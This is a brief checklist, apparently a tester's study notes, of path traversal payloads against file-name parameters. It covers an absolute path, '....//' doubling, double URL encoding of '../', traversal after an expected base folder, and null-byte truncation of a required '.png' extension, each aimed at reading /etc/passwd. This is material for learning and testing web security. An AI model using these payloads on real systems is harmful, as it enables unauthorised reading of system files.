- [ ] Try absolute path `/etc/passwd`, and double things `....//`. `double url encoding` | `../` --> ``%2e%2e%2f`` --> `%252e%252e%252f`.
- [ ] Give it right base folder, `filename=/var/www/images/../../../etc/passwd`
- [ ] if valied extension is required try null byte. `filename=../../../etc/passwd%00.png`

---
- If app expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`.
- If app expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: `filename=../../../etc/passwd%00.png`.